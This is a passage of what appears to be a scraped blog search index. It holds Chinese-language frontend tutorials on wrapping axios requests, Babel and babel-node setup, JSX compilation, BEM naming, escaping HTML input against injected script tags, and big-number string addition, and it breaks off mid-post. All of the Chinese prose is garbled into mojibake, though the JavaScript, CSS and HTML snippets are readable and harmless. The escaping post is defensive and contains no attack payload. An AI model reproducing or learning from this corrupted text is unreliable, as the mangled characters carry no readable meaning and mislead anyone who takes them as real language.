å°è£é›–ç„¶ä¸Šé¢åšå¥½å¾Œå°±å¯ä»¥ç›´æ¥ç”¨äº†ï¼Œä¸éæ›´å¥½çš„æ–¹å¼æ˜¯æŠŠä»–åšå°è£èµ·ä¾†ï¼Œè®“æˆ‘å€‘åœ¨ç”¨çš„æ™‚å€™æ›´ç›´è¦ºï¼Œåƒé€™æ¨£ï¼š 12345// å–å¾—çš„ç¬¬ä¸€é çš„ user åˆ—è¡¨gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) ç¶“éåŒ…è£å¾Œå°±èƒ½å¾ˆå¿«çŸ¥é“æˆ‘å€‘è¦ç”¨å“ªéš» APIï¼Œè·Ÿè¦å¸¶çš„è³‡æ–™ã€åƒæ•¸æ˜¯ä»€éº¼ã€‚ ä¸ç„¶åŸæœ¬çš„è©±å¾—é€™æ¨£å¯«ï¼š 123instance.get('/users/1') .then(res =&gt; console.log(res)) .catch(err =&gt; console.log('err', err)) æ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯å…ˆæŠŠ method ç”¨ function ä¾†åŒ…è£èµ·ä¾†ï¼Œè®“å®ƒå¯ä»¥é€éåƒæ•¸ä¾†æ±ºå®šè¦åšä»€éº¼äº‹ï¼š 12345678910111213141516171819// parms æ˜¯ query stringï¼Œä¾‹å¦‚ï¼šhttps://example[?gender=female&amp;age=20]export function api (method, url, data = null, config) { method = method.toLowerCase(); switch (method) { case \"post\": return instance.post(url, data, config) case \"get\": return instance.get(url, { params: data }) case \"delete\": return instance.delete(url, { params: data }) case \"put\": return instance.put(url, data) case \"patch\": return instance.patch(url, data) default: console.log('unknown method type'); return false; }} é™„è¨»ï¼é—œæ–¼ axios çš„åƒæ•¸å€¼æˆ‘åŸæœ¬ä¸å¤ªæ‡‚ä¸Šé¢çš„åƒæ•¸å€¼ç‚ºä»€éº¼å¯ä»¥é‚£æ¨£è¨­ï¼Œæ‰€ä»¥é€™é‚Šæ‰ç•™å€‹è£œå……ã€‚å¦‚æœä½ æœ¬ä¾†å°±çœ‹å¾—æ‡‚çš„è©±è«‹ç„¡è¦–é€™ä¸€æ®µã€‚ ä¾†èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘æƒ³ç™¼ä¸€å€‹ POST è«‹æ±‚ï¼Œé‚£æˆ‘æœ‰å…©ç¨®å¯«æ³•ã€‚ ç¬¬ä¸€ç¨®æ˜¯ç”¨ post() æ–¹æ³• + url + data + configï¼š 123456789axios.post(\"https://example.com/api/users\", { name: \"PeaNu\", age: 20, des: \"...\"}, { params: { token: \"123456\" }}) ç¬¬äºŒç¨®æ˜¯å…¨éƒ¨å¡åœ¨ configï¼š 123456789101112axios({ method: \"post\", url: 'https://aaa.com/api/users', data: { name: 'PeaNU', age: 20, des: \"...\" }, params: { token: \"12345\" }}) ç¸½ä¹‹é€™å…©å€‹æ±è¥¿æœƒæ˜¯ä¸€æ¨£çš„ï¼Œåªæ˜¯å¯«æ³•ä¸åŒè€Œå·²ã€‚ è€Œä¸Šé¢ç”¨çš„ instance.post æ­£æ˜¯ç¬¬ä¸€ç¨®å¯«æ³•ï¼Œæ‰€ä»¥æ‰è¦å‚³çµ¦ä»– url + data + config é€™ä¸‰å€‹åƒæ•¸ã€‚ æœ€å¾Œå†è£œå……ä¸€ä»¶äº‹ï¼Œå°±æ˜¯ get() è·Ÿ delete() å› ç‚ºä¸éœ€è¦å‚³è³‡æ–™ï¼Œæ‰€ä»¥åªæœƒæœ‰ url è·Ÿ config é€™å…©å€‹åƒæ•¸ï¼Œæ‰€ä»¥ä¸Šé¢æ‰æœƒå¯«æˆ instance.delete(url, { params: data }) çš„å½¢å¼ã€‚ å¦‚æœæ€•å¿˜è¨˜çš„è©±å¯ä»¥åƒè€ƒ vs code çš„ TypeScript æç¤º OKï¼Œè§£èªªå°±åˆ°é€™é‚Šç‚ºæ­¢ã€‚ æ¥è‘—æ–°å¢ä¸€å€‹æª”æ¡ˆï¼Œè®“è·Ÿå‰›å‰› export å‡ºä¾†çš„ function åœ¨åšä¸€å±¤åŒ…è£ï¼š 1234567891011121314151617181920212223// user.jsimport { api } from \"./api\";const URL = \"/users\";export const gerUserList = (data) =&gt; { return api(\"GET\", URL, data);}export const addUser = (data) =&gt; { return api(\"POST\", URL, data);}export const putUser = (userId, data) =&gt; { return api(\"PUT\", `${URL}/${userId}`, data);}export const patchUser = (userId, data) =&gt; { return api(\"PATCH\", `${URL}/${userId}`, data);}export const deleteUser = (userId) =&gt; { return api(\"DELETE\", `${URL}/${userId}`);} æˆ–ä½ è¦ç”¨ OOP çš„æ–¹å¼åŒ…è£æˆ class ä¹Ÿå¯ä»¥ï¼š 12345678910111213141516171819202122232425import { api } from \"./api\";const URL = \"/users\";export class UserApi { gerUserList = async (data) =&gt; { return api(\"GET\", URL, data); } addUser = async (data) =&gt; { return api(\"POST\", URL, data); } putUser = async (userId, data) =&gt; { return api(\"PUT\", `${URL}/${userId}`, data); } patchUser = async (userId, data) =&gt; { return api(\"PATCH\", `${URL}/${userId}`, data); } deleteUser = async (userId) =&gt; { return api(\"DELETE\", `${URL}/${userId}`); }} æœ€å¾Œå‘¢ï¼Œå°±å¯ä»¥æŠŠæˆ‘å€‘å¯«å¥½çš„æ±è¥¿æ‹¿ä¾†ç”¨äº†ï¼š 1234567import { gerUserList } from \"./user\";gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) class çš„å¯«æ³•ï¼š 1234567import { UserApi } from \"./userByClass\";const api = new UserApi();api.gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) ä»¥ä¸Šï¼Œæœ‰ä»»ä½•å•é¡Œçš„è©±éƒ½å¯ä»¥åˆ°é€™é‚Šåƒè€ƒåŸå§‹ç¢¼ã€‚ åƒè€ƒè³‡æ–™ ç”¨ Axios Instance ç®¡ç† API","link":"/2022/05/12/axios-instance/"},{"title":"babel-node åˆé«”é©—","text":"ç°¡å–®ç©ä¸€ä¸‹ã€‚ ä»€éº¼æ˜¯ babel-nodeç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹è·Ÿ node å¾ˆåƒçš„æŒ‡ä»¤ï¼Œç”¨ babel-node ä¾†åŸ·è¡Œæ™‚æœƒå…ˆå¹«ä½ ã€Œç·¨è­¯ã€æˆèˆŠçš„èªæ³•åœ¨åŸ·è¡Œï¼Œæ‰€ä»¥ä½ å¯ä»¥ç”¨ babel-node ä¾†è·‘ä¸€ä¸‹ ES6 æˆ–æ–°çš„èªæ³•ã€‚ ä½†è¦æé†’ä¸€ä¸‹ï¼Œé€™å€‹åªé©åˆç”¨åœ¨ developmentï¼Œå¦‚æœç”¨åœ¨ production çš„è©±æ•ˆèƒ½æœƒä¸å¥½ã€‚ æ›´å¤šè©³ç´°å¯ä»¥åƒè€ƒ å®˜ç¶² æ‰€ä»¥å¦‚æœä½ åªæ˜¯æƒ³ç¨å¾®ç©ä¸€ä¸‹æ–°èªæ³•ï¼Œä½†åˆè¦ºå¾—è¦å…ˆæŠŠæª”æ¡ˆç·¨è­¯æˆ bundle.js å¤ªéº»ç…©çš„è©±ï¼Œå¯ä»¥ç”¨é€™å€‹å¥—ä»¶ä¾†ç©ä¸€ä¸‹ã€‚ è©²å®‰è£çš„æ±è¥¿èˆ‡è¨­å®šå®‰è£ä»¥ä¸‹é€™äº›å¥—ä»¶ï¼š 12npm install --save-dev @babel/core @babel/nodenpm install --save-dev @babel/preset-env ç°¡å–®è§£é‡‹ä¸€ä¸‹ @babel/core æ˜¯ babel çš„ä¸»è¦å…§å®¹ï¼Œå¤§éƒ¨åˆ†çš„ babel å¥—ä»¶éƒ½éœ€è¦ä¾è³´å®ƒä¾†åŸ·è¡Œã€‚@babel/node å°±æ˜¯é€™æ¬¡è¦ä½¿ç”¨çš„å¥—ä»¶ã€‚ è‡³æ–¼ @babel/preset-env æ˜¯ç”¨ä¾†å° babel åš preset è¨­å®šçš„å¥—ä»¶ï¼Œç”¨ä¾†è·Ÿ babel èªªã€Œè«‹ä½ å¹«æˆ‘æŠŠ xxx èªæ³•è½‰æˆ xxx èªæ³•ã€ï¼Œå¤§æ¦‚æ˜¯é€™æ¨£çš„æ„æ€ã€‚ æœ€å¾Œè¦è¨˜å¾—å»ºç«‹ .babelrc æª”æ¡ˆä¾†å‘Šè¨´ babel ä½ è¦ç”¨ @babel/preset-env é€™å€‹å¥—ä»¶ï¼š 123{ \"presets\": [\"@babel/preset-env\"]} ç°¡å–®ç¤ºç¯„å‡è¨­æˆ‘ç¾åœ¨ç”¨ ES6 çš„ import è·Ÿ export çš„èªæ³•ä¾†å¯«æ¨¡çµ„ï¼š 1234// utils.jsexport function add(a, b) { return a + b} 123// main.jsimport { add } from './utils.js'console.log(add(1, 2)) å¦‚æœæˆ‘ç›´æ¥ç”¨ node main.js çš„è©±ï¼š 123456789101112131415161718user@LAPTOP-3A1RJ558 MINGW64 /d/test_folder$ node main.js(node:20824) Warning: To load an ES module, set \"type\": \"module\" in the package.jsonor use the .mjs extension.(Use `node --trace-warnings ...` to show where the warning was created)D:\\test_folder\\main.js:10import { add } from './utils.js'^^^^^^SyntaxError: Cannot use import statement outside a module at wrapSafe (internal/modules/cjs/loader.js:984:16) at Module._compile (internal/modules/cjs/loader.js:1032:27) at Object.Module._extensions..js (internal/modules/cjs/loader.js:1097:10) at Module.load (internal/modules/cjs/loader.js:933:32) at Function.Module._load (internal/modules/cjs/loader.js:774:14) at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:72:12) at internal/main/run_main_module.js:17:47 ï¼ˆç¾åœ¨ Node.js æœ‰æä¾›å…§å»ºçš„æ–¹å¼ä¾†åŸ·è¡Œ import èˆ‡ exportï¼Œæ‰€ä»¥éŒ¯èª¤è¨Šæ¯æœ‰è·Ÿä½ èªªè©²åšä»€éº¼è¨­å®šï¼‰ ç°¡å–®ä¾†èªªå°±æ˜¯ä¸æ”¯æ´é€™å€‹èªæ³•ï¼Œæ‰€ä»¥æ²’è¾¦æ³•è·‘ã€‚ ç¾åœ¨æ”¹ç”¨ npx babel-node main.jsï¼š 13 // åŸ·è¡ŒæˆåŠŸ é€™æ¨£å°±å¯ä»¥å®‰å¿ƒå¯« ES6 å›‰ã€‚","link":"/2021/12/25/babel-node/"},{"title":"babel ä¹‹å†æ¬¡è¤‡ç¿’","text":"å†è¤‡ç¿’ä¸€æ¬¡ã€‚ ç°¡è¿°å…ˆå®‰è£ 3 å€‹æ±è¥¿ï¼š @babel/core @babel/cli @babel/preset-env è£å®Œå¾Œ package.json æ‡‰è©²è¦é•·é€™æ¨£ï¼š 12345\"devDependencies\": { \"@babel/cli\": \"^7.17.6\", \"@babel/core\": \"^7.17.5\", \"@babel/preset-env\": \"^7.16.11\",} æ¥è‘—åœ¨æ ¹ç›®éŒ„å»ºç«‹ .babel.config.jsonï¼Œç”¨ä¾†è¨­å®š preset çš„è³‡è¨Šï¼š 123{ \"presets\": [\"@babel/preset-env\"]} é€™æ”¯æª”æ¡ˆè£¡é¢å¯ä»¥å¯«ä¸€äº›è¨­å®šï¼Œä¾‹å¦‚èªªè¦æ”¯æ´ 0.25% äººåœ¨ä½¿ç”¨çš„ç€è¦½å™¨å°±æœƒé€™æ¨£å¯«ï¼š 12345678910{ \"presets\": [ [ \"@babel/preset-env\", { \"useBuiltIns\": \"entry\" } ] ]} é€šå¸¸é è¨­çš„è¨­å®šå°±å¾ˆå¤ ç”¨äº†ï¼Œæ‰€ä»¥æ²’ç‰¹æ®Šéœ€æ±‚çš„è©±ä¸ç”¨æ”¹ã€‚ å¯¦éš›ä½¿ç”¨æ¥è‘—ä¾†å¯«ä¸€äº› ES6 çš„æ±è¥¿ï¼Œçœ‹ç”¨ babel è½‰å®Œå¾Œæœƒè®Šæ€æ¨£ï¼š 1234567const a = 1;const b = [1, 2, 3, 4];const c = [...b];for (let n of c) { console.log(n);} æ¥è‘—åŸ·è¡Œ babelï¼š 1234# é€é package.json åŸ·è¡Œ babel src -d libnpm run build# é€é npxnpx babel src -d lib è¼¸å‡ºçµæœï¼š 12345678910111213141516171819202122232425\"use strict\";function _createForOfIteratorHelper(o, allowArrayLike) { var it = typeof Symbol !== \"undefined\" &amp;&amp; o[Symbol.iterator] || o[\"@@iterator\"]; if (!it) { if (Array.isArray(o) || (it = _unsupportedIterableToArray(o)) || allowArrayLike &amp;&amp; o &amp;&amp; typeof o.length === \"number\") { if (it) o = it; var i = 0; var F = function F() {}; return { s: F, n: function n() { if (i &gt;= o.length) return { done: true }; return { done: false, value: o[i++] }; }, e: function e(_e) { throw _e; }, f: F }; } throw new TypeError(\"Invalid attempt to iterate non-iterable instance.\\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.\"); } var normalCompletion = true, didErr = false, err; return { s: function s() { it = it.call(o); }, n: function n() { var step = it.next(); normalCompletion = step.done; return step; }, e: function e(_e2) { didErr = true; err = _e2; }, f: function f() { try { if (!normalCompletion &amp;&amp; it[\"return\"] != null) it[\"return\"](); } finally { if (didErr) throw err; } } }; }function _unsupportedIterableToArray(o, minLen) { if (!o) return; if (typeof o === \"string\") return _arrayLikeToArray(o, minLen); var n = Object.prototype.toString.call(o).slice(8, -1); if (n === \"Object\" &amp;&amp; o.constructor) n = o.constructor.name; if (n === \"Map\" || n === \"Set\") return Array.from(o); if (n === \"Arguments\" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen); }function _arrayLikeToArray(arr, len) { if (len == null || len &gt; arr.length) len = arr.length; for (var i = 0, arr2 = new Array(len); i &lt; len; i++) { arr2[i] = arr[i]; } return arr2; }var a = 1;var b = [1, 2, 3, 4];var c = [].concat(b);var _iterator = _createForOfIteratorHelper(c), _step;try { for (_iterator.s(); !(_step = _iterator.n()).done;) { var n = _step.value; console.log(n); }} catch (err) { _iterator.e(err);} finally { _iterator.f();} çœ‹èµ·ä¾†äº‚ä¸ƒå…«ç³Ÿçš„ï¼Œä½†ä¸è¦ç·Šï¼é€™æ˜¯ babel ç‚ºäº†æ”¯æ´èˆŠçš„ç€è¦½å™¨è€ŒåŠ ä¸Šçš„ç¨‹å¼ç¢¼ã€‚ ç¸½ä¹‹å‘¢ï¼Œåªè¦å¼•å…¥é€™æ”¯æª”æ¡ˆå°±èƒ½æ”¯æ´èˆŠçš„ç€è¦½å™¨å›‰ï¼","link":"/2022/02/28/babel-usage/"},{"title":"JSX çš„åŸç†","text":"åŸä¾†å¦‚æ­¤ã€‚ ç°¡è¿° å°±åªæ˜¯ babel è€Œå·² å°ï¼Œå…¶å¯¦ JSX èƒŒå¾Œåªæ˜¯é€é babel ä¾†åšè½‰è­¯è€Œå·²ï¼š 1&lt;Button name=\"cool\" onClick={() =&gt; console.log('yo')}&gt;yo&lt;/Button&gt; 123456React.createElement(Button, { name: \"cool\", onClick: function onClick() { return console.log('yo'); }}, \"yo\"); å…©å€‹æ±è¥¿æ˜¯ç­‰åƒ¹çš„ï¼Œæ‰€ä»¥ JSX ä¸æ˜¯ä»€éº¼é»‘é­”æ³•ï¼ŒçœŸçš„å°±åªæ˜¯ Babel è€Œå·²ï¼","link":"/2022/04/05/behide-jsx/"},{"title":"BEMéš¨ç­†è¨˜","text":"ç´€éŒ„ä¸€äº› BEM åœ¨ä½¿ç”¨æ™‚å¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œã€‚ å° Modifier ä¸‹çš„ Element å®šç¾©æ–°çš„è¦å‰‡å‡ä½¿æˆ‘å€‘æœ‰ä¸€å€‹å¡ç‰‡çµ„ä»¶å¦‚ä¸‹ï¼š 123456&lt;article class=\"card\"&gt; &lt;h2 class=\"card__title\"&gt;...&lt;/h2&gt; &lt;p class=\"card__text\"&gt;...&lt;/p&gt; &lt;p class=\"card__text card__text--secondary\"&gt;...&lt;/p&gt; &lt;a class=\"card__button\" href=\"#\"&gt;...&lt;/a&gt;&lt;/article&gt; ç¾åœ¨æˆ‘å€‘æƒ³è¦å®šç¾©ä¸€å€‹æ–°çš„ Modiefierï¼Œ card--featureï¼Œæœƒé•·é€™æ¨£å­ã€‚ é™¤äº† card--feature çš„èƒŒæ™¯é¡è‰²æœƒæ”¹è®Šä¹‹å¤–ï¼Œ å…¶ä¸‹çš„ card__title, card__text, card__button ä¹Ÿéƒ½è¦åšä¿®æ”¹ï¼Œé€™ç¨®æ™‚å€™è©²æ€éº¼å¯«æ‰å¥½ï¼Ÿ æœ‰äº›äººæœƒé€™æ¨£å­å¯«ï¼š 1234567891011121314151617181920212223242526272829.card { // ... &amp;__title { // ... } &amp;__text { // ... } &amp;__button { // ... } /* --feature è·Ÿ .card éƒ½æ˜¯æŒ‡åˆ°åŒå€‹å…ƒç´  æ‰€ä»¥ä¸‹é¢çš„ Element éƒ½æ˜¯åŒæ¨£çš„ï¼š (.card &gt; card__title) === (.card--feature &gt; card--feature__title) */ &amp;--feature { // ... .card__title { // ... } .card__text { // ... } .card__button { // ... } }} ä½†å¦‚æœä»Šå¤©è¦æ”¹ class åç¨±çš„æ™‚å€™ï¼Œè¦ä¿®æ”¹çš„åœ°æ–¹å°±æœƒè®Šå¾ˆå¤šã€‚ æ‰€ä»¥å»ºè­°ä½ å¯ä»¥é€™æ¨£å­å¯«ï¼š 1234567891011121314151617181920212223242526272829.card { // ... &amp;__title { // ... } &amp;__text { // ... } &amp;__button { // ... } /* --feature è·Ÿ .card éƒ½æ˜¯æŒ‡åˆ°åŒå€‹å…ƒç´  æ‰€ä»¥ä¸‹é¢çš„ Element éƒ½æ˜¯åŒæ¨£çš„ï¼š (.card &gt; card__title) === (.card--feature &gt; card--feature__title) */ &amp;--feature { // ... } &amp;--feature &amp;__title { // ... } &amp;--feature &amp;__text { // ... } &amp;--feature &amp;__button { // ... }} é€™æ¨£å­è¦æ”¹ class åç¨±æ™‚ï¼Œåªè¦æ”¹æœ€å¤–å±¤é‚£å€‹ card å°±è§£æ±ºå›‰ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ ä»€éº¼æ™‚å€™ä¸è©²å¯«æˆ BEMç•¶æœ‰ä¸€å€‹ class æ˜¯å¯ä»¥ç¨ç«‹å­˜åœ¨çš„æ™‚å€™ ä¾‹å¦‚ï¼š 123.clearfix { clear: both;} é›–ç„¶æŒ‰ç…§ BEM çš„è¦å‰‡ï¼Œä½ å¯ä»¥æŠŠå®ƒæ­¸é¡æˆModifierã€‚ä½†å®ƒå…¶å¯¦æ˜¯ä¸€å€‹å¯ä»¥ç¨è‡ªå­˜åœ¨çš„ classï¼Œè€Œä¸”å¯ä»¥ç”¨åœ¨ç¶²é çš„å„ç¨®åœ°æ–¹ã€‚æ‰€ä»¥æ¯”èµ·å¯«æˆmodifierï¼ŒæŠŠå®ƒæ­¸é¡ç‚ºä¸€å€‹å–®ç¨å­˜åœ¨çš„ classï¼Œæˆ–è¨±æœƒæ›´é©åˆã€‚ é©åˆæ¨¡çµ„åŒ–çš„æ™‚æ©Ÿå‡è¨­ä½ çš„ HTML çµæ§‹é•·é€™æ¨£ï¼š 1234567&lt;div class=\"content\"&gt; &lt;ul class=\"menu\"&gt; &lt;li class=\"item\"&gt;menu1&lt;/li&gt; &lt;li class=\"item\"&gt;menu2&lt;/li&gt; &lt;li class=\"item\"&gt;menu3&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; ä½ å¯èƒ½æœƒå¾ˆç›´è¦ºçš„å¯«æˆcontent__menué€™ç¨®çµæ§‹ã€‚ä½†æ˜¯å¦‚æœä½ é€™æ¨£å­å¯«ï¼Œæ„æ€å°±æœƒæ˜¯ï¼Œmenu è·Ÿ content å€å¡Šç¶åœ¨ä¸€èµ·ã€‚ é‚£å¦‚æœç¶²é ä¸­æœ‰å…¶ä»–çš„åœ°æ–¹ä¹Ÿæœƒæœ‰é¸å–®çš„è©±å‘¢ï¼Ÿä½ å°±æ²’è¾¦æ³•ç›´æ¥æ‹¿menué€™å€‹æ¨¡çµ„ä¾†ç”¨äº†ï¼Œå› ç‚ºå®ƒè·Ÿcontentç¶åœ¨ä¸€èµ·äº†ã€‚ æ‰€ä»¥æˆ‘å€‘é€é BEM ä¾†å»ºç«‹æ¯å€‹æ¨¡çµ„çš„æ™‚å€™è¦æ€è€ƒä¸€ä»¶äº‹ï¼šã€Œé€™å€‹å€å¡Šæœ‰æ²’æœ‰å¯èƒ½æœƒåœ¨ç¶²é çš„å…¶ä»–åœ°æ–¹å‡ºç¾ã€ æ‰€ä»¥å›åˆ°ä¸Šé¢çš„ä¾‹å­ã€‚æ¯”èµ·è®“menuä½œç‚ºcontentä¸‹çš„Elementï¼Œmenuæ›´é©åˆç•¶ä½œæ˜¯ä¸€å€‹Blockï¼Œé€™æ¨£å­menuæœƒæˆç‚ºä¸€å€‹æ¨¡çµ„ï¼Œä¹Ÿå°±æœ‰æ›´é«˜çš„éˆæ´»æ€§ã€‚ ä¸€å€‹ Block ä¸‹æœ€å¤šåªæœƒé€£æ¥ä¸€å€‹ Elementé€™è£¡å¼•ç”¨ä¾†è‡ªBEM by Exampleçš„ä¸€æ®µæ•˜è¿°ï¼š If your component has child elements several levels deep, donâ€™t try to represent each level in the class name. BEM is not intended to communicate structural depth. A BEM class name representing a child element in the component should only include the base/block name and the one element name. æ„æ€æ˜¯èªªï¼Œå‡ä½¿ä¸€å€‹ component ä¸‹æœ‰å¤šå€‹å±¤ç´šçš„å­å…ƒç´ ï¼Œæˆ‘å€‘ä¹Ÿä¸å¿…åœ¨ BEM æŠŠæ¯ä¸€å±¤çš„çµæ§‹å¯«å‡ºä¾†ï¼Œè­¬å¦‚èªªï¼š 123456789&lt;figure class=\"photo\"&gt; &lt;img class=\"photo__img\" src=\"image.jpg\" /&gt; &lt;figcaption class=\"photo__caption\"&gt; åœ–ç‰‡è§£èªª &lt;blockquote class=\"photo__caption__quote\"&gt; ä¸è¦åœ¨ä¸€å€‹classè£¡é¢æ”¾ä¸€å€‹ä»¥ä¸Šçš„element &lt;/blockquote&gt; &lt;/figcaption&gt;&lt;/figure&gt; æ‰€ä»¥ä¸€å€‹Blockä¸‹æœ€å¤šåªæœƒå¯«ä¸€å±¤Elementï¼š 1234567&lt;figure class=\"photo\"&gt; &lt;img class=\"photo__img\" src=\"image.jpg\" /&gt; &lt;figcaption class=\"photo__caption\"&gt; åœ–ç‰‡è§£èªª &lt;blockquote class=\"photo__quote\"&gt;é€™æ¨£å°±å°äº†&lt;/blockquote&gt; &lt;/figcaption&gt;&lt;/figure&gt; å³ä¾¿ä½ æ²’æœ‰æŠŠæ¯ä¸€å€‹å±¤ç´šéƒ½å¯«å‡ºä¾†ï¼Œä¹Ÿèƒ½å¤ çœ‹å‡ºimg, caption, quoteéƒ½æ˜¯photoé€™å€‹ component ä¸‹çš„å…ƒç´ ã€‚ æ‰€ä»¥åªè¦æŒæ¡ä½ä¸€å€‹åŸå‰‡ï¼šé€™å€‹å…ƒç´ æ˜¯å“ªå€‹ component ä¸‹çš„å…ƒç´ ï¼Œå°±èƒ½å¯«å‡ºç°¡æ½”æ¸…æ¥šçš„ class åç¨±ã€‚ æœ‰äº›å…ƒç´ ä¸éœ€è¦ç¶åœ¨ Block ä¸Šæ‹¿æˆ‘åœ¨Frontend MentoræŒ‘æˆ°ä¸­çš„headeréƒ¨åˆ†ä¾†èˆ‰ä¾‹ï¼š 1234&lt;header class=\"header\"&gt; &lt;h3 class=\"slogan\"&gt;WE ARE CREATIVES&lt;/h3&gt; &lt;a class=\"arrow\"&gt;&lt;img class=\"pic\" src=\"arrow.jpg\" /&gt;&lt;/a&gt;&lt;/header&gt; sloganè·Ÿarrowé€™å…©å€‹å…ƒç´ å…¶å¯¦éƒ½èƒ½ç¨è‡ªå­˜åœ¨ï¼Œä¸¦æ²’æœ‰ä¸€å®šè¦ç¶åœ¨headeré€™å€‹Blockä¸Šï¼ˆé™¤éä½ æŠŠæ•´å€‹headerç•¶æˆæ˜¯ä¸€å€‹ componentï¼‰ï¼Œæ‰€ä»¥å°±ä¸å»ºè­°é€™æ¨£å­å¯«ï¼š 1234&lt;header class=\"header\"&gt; &lt;h3 class=\"header__slogan\"&gt;WE ARE CREATIVES&lt;/h3&gt; &lt;a class=\"header__arrow\"&gt;&lt;img class=\"header__pic\" src=\"arrow.jpg\" /&gt;&lt;/a&gt;&lt;/header&gt; é€™ç¨®æƒ…æ³å¤§å¤šæœƒç™¼ç”Ÿåœ¨æ–‡å­—çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥é€™ç¨®æ™‚å€™å°±å»ºè­°å¯«ä¸€å€‹æ–¹ä¾¿è­˜åˆ¥çš„ class å°±å¥½ï¼Œä¸ç”¨ä¸€å®šè¦ç…§è‘— BEM çš„è¦å‰‡ä¾†å‘½åã€‚ åƒè€ƒè³‡æ–™BEM by Exampleç«¹ç™½è¨˜äº‹æœ¬-BEMï¼ŒCSS è¨­è¨ˆæ¨¡å¼IT äºº-[è­¯] CSS ä½¿ç”¨ BEM å‘½åè¦ç¯„çš„äº”å¤§ç†ç”±","link":"/2021/07/28/bem-note/"},{"title":"å–„ç”¨è·³è„«å­—å…ƒï¼Œé¿å…ä¸åˆæ³•çš„è¼¸å…¥å…§å®¹","text":"è³‡å®‰å‘€ï½ ç°¡è¿°åœ¨åš Todo list çš„æ™‚å€™å°±æœ‰é å…ˆæƒ³åˆ°å¯èƒ½æœƒæœ‰é€™ç¨®æƒ…æ³ï¼š å¦‚æœä½ æ²’æœ‰åšä»»ä½•é˜²ç¯„ï¼Œä½¿ç”¨è€…å°±èƒ½ç›´æ¥æŠŠ &lt;script&gt; å¡åˆ°ä½ çš„ç¶²é åšå£äº‹ã€‚ æ¯”è¼ƒå®‰å…¨çš„ä½œæ³•æ‰€ä»¥å¯ä»¥å¯«ä¸€å€‹ function å°ˆé–€è·³è„«é€™äº›å±éšªå­—å…ƒï¼š 123456789/* æŠŠ &lt; &gt; @ ' \" éƒ½åšå­—å…ƒè·³è„« */function escapeHTML(unsafe) { return unsafe .replace(/&amp;/g, '&amp;amp;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/'/g, '&amp;#039;') .replace(/\"/g, '&amp;quot;')} å‚™è¨»ï¼šå»ºè­°ä¸è¦äº‚æ”¹é€™å€‹é †åºï¼Œå¦å‰‡è¼¸å‡ºçµæœå¯èƒ½è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£ã€‚ é€™æ¨£å­å°±èƒ½åšåˆ°ã€Œæœ€åŸºæœ¬ã€çš„è³‡è¨Šå®‰å…¨ï¼Œç‰¹åˆ¥å¼·èª¿ã€ŒåŸºæœ¬ã€æ˜¯å› ç‚ºå²å®³çš„äººé‚„æ˜¯æœ‰è¾¦æ³•ç¹é“è€Œè¡Œã€‚","link":"/2022/01/24/beware-the-unsafe-input/"},{"title":"å¤§æ•¸ç›¸åŠ èˆ‡ç›¸ä¹˜","text":"è »æœ‰æŒ‘æˆ°æ€§çš„ä¸€é¡Œ ç°¡è¿°é€™é¡Œæ˜¯ä¾†è‡ªç¨‹å¼å°å¸«è¨ˆç•« week2 çš„è¶…ç´šè¶…ç´šæŒ‘æˆ°é¡Œã€‚ è§£é¡Œçš„é‚è¼¯èƒ½ç”¨ã€Œç›´å¼ç®—æ•¸ã€ä¾†æ€è€ƒï¼Œä¹Ÿå°±æ˜¯æŠŠå¤§å•é¡Œæ‹†æˆå°å•é¡Œçš„ä¸€ç¨®æ€è€ƒæ¨¡å¼ã€‚ å¤§æ•¸ç›¸åŠ å»ºè­°å…ˆæŠŠå¤§æ•¸ç›¸åŠ å¼„æ‡‚å†å»è§£ç›¸ä¹˜æœƒæ¯”è¼ƒå¥½ç†è§£ï¼Œå› ç‚ºåœ¨åšç›¸ä¹˜æ™‚ä¹Ÿéœ€è¦ç”¨åˆ°ç›¸åŠ çš„æ¦‚å¿µï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function add(a, b){ let result = ''; // æœ‰æ²’æœ‰é€²ä½ï¼ˆflagï¼‰ let hasCarryBit = false; // çœ‹èª°æ¯”è¼ƒé•· const lengthA = a.length; const lengthB = b.length; let totalDigits = undefined; // æ¯”è¼ƒçŸ­çš„æ•¸å­—è¦è£œ 0 if (lengthA &gt; lengthB) { totalDigits = lengthA; for (let i=0; i&lt;lengthA - lengthB; i++) { b = '0' + b; } } else if (lengthA &lt; lengthB) { totalDigits = lengthB; for (let i=0; i&lt;lengthB - lengthA; i++) { a = '0' + a; } } else { totalDigits = lengthA; } // æŠŠæ¯ä¸€ä½æ•¸ç›¸åŠ  for (let i=totalDigits-1; i&gt;=0; i--) { let value = Number(a[i]) + Number(b[i]); // ä¸Šä¸€ä½æœ‰é€²ä½å°±åŠ  1 if (hasCarryBit) { value += 1; hasCarryBit = false; } // &gt;= 10 æ›´æ–° flag if (value &gt;= 10) { hasCarryBit = true; } /* å–å‡ºæœ€å¾Œä¸€ä½æ•¸ 19 =&gt; 9 + '' =&gt; '9' 5 =&gt; 5 + '' =&gt; '69' 13 =&gt; 3 + '' =&gt; '369' ... */ result = value%10 + result; // å‰©ä¸€å€‹æ•¸å­— but æœ‰é€²ä½æ•¸è¦å†è£œ 1ï¼ˆå› ç‚ºä¸è·‘ä¸‹ä¸€åœˆï¼‰ if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result; } } // ç­”æ¡ˆ return result;}const TESTNUMBER = '124902814902890825902840917490127902791247902479027210970941724092174091274902749012740921759037590347438758957283947234273942304239403274093275902375902374092410937290371093719023729103790123';const ANSWER = BigInt(add(TESTNUMBER, TESTNUMBER));const BIGINT = 